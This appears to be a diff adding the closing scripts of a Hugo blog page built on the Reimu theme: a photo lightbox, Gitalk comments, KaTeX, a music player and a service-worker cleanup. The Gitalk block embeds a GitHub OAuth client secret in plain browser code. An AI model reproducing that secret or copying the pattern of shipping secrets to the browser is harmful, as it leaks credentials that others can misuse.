+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23liVVZivLwOTicsZy',
+            clientSecret: '057b213568c12232da732f30598c8bbe5999d32f',
+            repo: 'Zhi251.github.io',
+            owner: 'Zhi251',
+            admin: JSON.parse("[\"Zhi251\"]"),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.js"
+    data-pjaxintegrity="sha384-cMkvdD8LoxVzGF/RPUKAcvmm49FQ0oxwDF3BGKtDXcEc&#43;T1b2N&#43;teh/OJfpU0jr6" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.22/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script><script
+    src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js"
+    integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr&#43;h5UfruuRL/aORyw&#43;5&#43;HZoU6e" crossorigin="anonymous"></script><script>
+    if (window.matchMedia('(max-width: 959px)').matches) {
+      const meting = _$('meting-js');
+      if (meting) {
+        meting.setAttribute('fixed', 'true');
+        const aside = meting.parentNode?.parentNode;
+        if (aside?.tagName === 'ASIDE') {
+          meting.parentNode.removeChild(meting);
+          document.body.appendChild(meting);
+        }
+      }
+    }
+  </script><script
+    src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js"
+    integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8&#43;0maanw1S/IyB&#43;Y4JG&#43;ZDU7GpKE8" crossorigin="anonymous"></script></body>
+</html>
